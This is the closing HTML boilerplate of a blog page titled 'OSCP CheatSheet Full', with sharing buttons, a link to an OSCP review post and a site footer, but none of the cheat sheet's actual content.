          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        14288 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          25254-04-25 07:00
        

         
          
        
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=OSCP%20CheatSheet%20Full&amp;caption=OSCP%20CheatSheet%20Full&amp;canonicalUrl=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=OSCP%20CheatSheet%20Full&amp;body=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f&amp;media=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f;description=OSCP%20CheatSheet%20Full" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f&amp;title=OSCP%20CheatSheet%20Full&amp;summary=OSCP%20CheatSheet%20Full&amp;source=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f&amp;resubmit=true&amp;title=OSCP%20CheatSheet%20Full" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f;title=OSCP%20CheatSheet%20Full" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=OSCP%20CheatSheet%20Full%20https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f&amp;t=OSCP%20CheatSheet%20Full" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=OSCP%20CheatSheet%20Full&amp;url=https%3a%2f%2ftranquac.github.io%2fposts%2f2021%2f04%2foscp-cheatsheet-full%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
    <div class="pagination">
        <div class="pagination__title">
            <span class="pagination__title-h"></span>
            <hr />
        </div>

        <div class="pagination__buttons">
            

            
            <span class="button next">
                <a href="https://tranquac.github.io/posts/2021/04/getting-the-oscp-certification-offensive-security-certified-professional-pen-200-review/">
                    <span class="button__text">Getting the OSCP Certification: &#39;Offensive Security Certified Professional&#39; (PEN-200) review</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    

    

  </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2021</span>
            <span><a href="https://tranquac.github.io">Quac Tran</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://tranquac.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/tranquac">Quac Tran</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://tranquac.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>



    </body>
</html>
